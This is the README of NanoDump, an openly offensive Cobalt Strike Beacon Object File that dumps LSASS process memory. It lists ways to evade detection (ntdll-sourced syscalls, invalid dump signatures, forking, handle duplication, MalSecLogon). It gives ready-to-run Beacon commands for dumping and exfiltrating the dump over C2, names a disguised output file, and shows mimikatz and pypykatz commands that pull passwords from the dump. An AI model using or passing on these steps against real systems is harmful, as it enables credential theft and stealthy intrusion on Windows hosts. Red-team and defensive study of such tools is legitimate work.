# NanoDump

A Beacon Object File that creates a minidump of the LSASS process.

![screenshot](demo.png)

### Features
- It uses syscalls (with [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2)) for most operations
- Syscalls are called from an *ntdll* address to bypass some syscall detections
- Windows APIs are called using dynamic invoke
- You can choose to download the dump without touching disk or write it to a file
- The minidump by default has an invalid signature to avoid detection
- It reduces the size of the dump by ignoring irrelevant DLLs. The (nano)dump tends to be arround 10 MB in size
- You don't need to provide the PID of LSASS
- No calls to *dbghelp* or any other library are made, all the dump logic is implemented in nanodump
- Supports process forking to avoid the permission `PROCESS_VM_READ`
- Supports handle duplication
- Supports MalSecLogon
- You can use the .exe version to run *nanodump* outside of Cobalt Strike :smile:

## Usage

### Clone

```bash
git clone https://github.com/helpsystems/nanodump.git
```

### Compile with MinGW (optional)

```bash
make
```

### Import

Import the `NanoDump.cna` script on Cobalt Strike.


### Run

Run the `nanodump` command in the Beacon console.

```
beacon> nanodump
```

### Restore the signature
Once you downloaded the minidump, restore the invalid signature
```zsh
bash restore_signature.sh <dumpfile>
```

### get the secretz

#### mimikatz
To get the secrets simply run:
```
mimikatz # sekurlsa::minidump <dumpfile>
mimikatz # sekurlsa::logonPasswords full
```

#### pypykatz
If you prefer to stay on linux, you can use the python3 port of mimikatz called [pypykatz](https://github.com/skelsec/pypykatz).  
```sh
python3 -m pypykatz lsa minidump <dumpfie>
```

## Parameters

#### --getpid
Get PID of LSASS and leave.  
This is just for convenience, nanodump does not need the PID of LSASS.

#### --write -w < path > (required for EXE)
Where to write the dumpfile.
* **BOF**: If this parameter is not provided, the dump will be downloaded in a fileless manner.
* **EXE**: This parameter is required given that no C2 channel exists

#### --valid -v
The minidump will have a valid signature.  
If not entered, the signature will be invalid. Before analyzing the dump restore the signature of the dump, with:  
`bash restore_signature.sh <dumpfile>`  

#### --fork -f
Create a handle to LSASS with `PROCESS_CREATE_PROCESS` access and then create a 'clone' of the process. This new process will then be the target for memory dumping. While this will result in a new process creation, it removes the need to read LSASS directly.

#### --dup -d
List all the handles in the system and look for an existing handle to LSASS. If found, duplicate it and access LSASS with it. This eliminates the need to open a new handle to LSASS directly.  
*(Be aware that there is no guarantee to find such handle)*

#### --malseclogon -m
Leak a handle to LSASS by abusing SecLogon with `CreateProcessWithLogonW`. This eliminates the need to open a new handle to LSASS directly.  
When this option is used, errors while analyzing the minidump are to be expected. Use the latest version of pypykatz.  
**If used as BOF, an unsigned binary will be written to disk unless --dup is also provided!**

#### --binary -b < path >
Path to a binary such as `C:\Windows\notepad.exe`.  
This option is used exclusively with `--malseclogon` and `--dup`. If used, nanodump will create that process and use MalSecLogon to leak an LSASS handle in it. Then, it will duplicate that handle and use it to access LSASS.  
The created process is then terminated automatically.


## Examples

Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:
```
beacon> nanodump --fork --write C:\lsass.dmp
```

Use MalSecLogon to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and download the dump  with a valid signature:
```
beacon> nanodump --malseclogon --dup --fork --binary C:\Windows\notepad.exe --valid
```

Get a handle with MalSecLogon, read LSASS indirectly by using a fork and write the dump to disk with a valid signature (a nanodump binary will be uploaded!):
```
beacon> nanodump --malseclogon --fork --valid --write C:\Windows\Temp\lsass.dmp
```

Download the dump with an invalid signature (default):
```
beacon> nanodump
```

Duplicate an existing handle and write the dump to disk with an invalid signature:
```
beacon> nanodump --dup --write C:\Windows\Temp\report.docx
```

Get the PID of LSASS:
```
beacon> nanodump --getpid
```

## HTTPS redirectors
If you are using an HTTPS redirector (as you should), you might run into issues due to the size of the requests that leak the dump.  
Increase the max size of requests on your web server to allow nanodump to download the dump.

#### NGINX
```
location ~ ^...$ {
    ...
    client_max_body_size 50M;
}
```
#### Apache2
```
<Directory "...">
    LimitRequestBody  52428800
</Directory>
```

## Credits
- [skelsec](https://twitter.com/skelsec) for writing [minidump](https://github.com/skelsec/minidump), which was crucial for learning the minidump file format.
- [freefirex](https://twitter.com/freefirex2) from [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) at Trustedsec for many cool tricks for BOFs
- [Jackson_T](https://twitter.com/Jackson_T) for [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2)
- [BillDemirkapi](https://twitter.com/BillDemirkapi) for [Process Forking](https://billdemirkapi.me/abusing-windows-implementation-of-fork-for-stealthy-memory-operations/)
- [Antonio Cocomazzi](https://twitter.com/splinter_code) for [MalSecLogon](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html)
